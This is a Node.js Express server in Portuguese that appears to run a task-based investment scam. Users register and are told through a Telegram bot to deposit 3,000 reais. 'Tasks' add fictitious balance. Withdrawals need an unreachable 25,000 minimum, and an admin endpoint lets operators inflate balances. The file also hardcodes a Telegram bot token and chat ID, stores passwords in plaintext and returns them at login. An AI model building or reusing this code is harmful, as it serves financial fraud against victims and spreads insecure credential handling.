const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const port = 3000;

// Configuração do bot do Telegram
const token = '7703975421:AAG-CG5Who2xs4NlevJqB5TNvjjzeUEDz8o';
const chatId = '-1002859771274';
const bot = new TelegramBot(token, { polling: false });

app.use(express.json());

// Simulação de banco de dados (em memória, substitua por MongoDB ou similar)
let users = [];
let adminToken = "admin123";

app.post('/register', (req, res) => {
  const { email, password } = req.body;
  if (users.find(u => u.email === email)) {
    return res.json({ success: false, message: "E-mail já registrado!" });
  }
  users.push({ id: Date.now(), email, password, balance: 0 });
  res.json({ success: true, message: "Registro bem-sucedido!" });
});

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const user = users.find(u => u.email === email && u.password === password);
  if (user) {
    res.json({ success: true, message: "Login bem-sucedido!", user });
  } else {
    res.json({ success: false, message: "E-mail ou senha inválidos!" });
  }
});

app.post('/deposit', (req, res) => {
  const { userId } = req.body;
  const user = users.find(u => u.id === parseInt(userId));
  if (user) {
    const message = `Coordenadas de depósito para o usuário ${user.email} (ID: ${user.id}): Faça o depósito de 3.000 reais. Contato: @AdminBot`;
    bot.sendMessage(chatId, message).then(() => {
      res.json({ success: true, message: "Link de depósito enviado via Telegram!" });
    }).catch(error => {
      res.json({ success: false, message: "Erro ao enviar mensagem: " + error.message });
    });
  } else {
    res.json({ success: false, message: "Usuário não encontrado!" });
  }
});

app.post('/task', (req, res) => {
  const { userId } = req.body;
  const user = users.find(u => u.id === parseInt(userId));
  if (user) {
    user.balance += 750;
    res.json({ success: true, message: "Tarefa concluída!" });
  } else {
    res.json({ success: false, message: "Usuário não encontrado!" });
  }
});

app.post('/withdraw', (req, res) => {
  const { userId } = req.body;
  const user = users.find(u => u.id === parseInt(userId));
  if (user && user.balance >= 25000) {
    const amount = user.balance;
    user.balance = 0;
    res.json({ success: true, message: "Saque processado!", amount });
  } else {
    res.json({ success: false, message: "Saldo insuficiente! Mínimo de 25.000 reais." });
  }
});

app.post('/admin/addBalance', (req, res) => {
  const { token, userId, amount } = req.body;
  if (token !== adminToken) return res.json({ success: false, message: "Acesso negado!" });
  const user = users.find(u => u.id === parseInt(userId));
  if (user) {
    user.balance += parseInt(amount);
    res.json({ success: true, message: "Saldo adicionado!" });
  } else {
    res.json({ success: false, message: "Usuário não encontrado!" });
  }
});

app.use(express.static('public'));
app.listen(port, () => console.log(`Server running on port ${port}`));
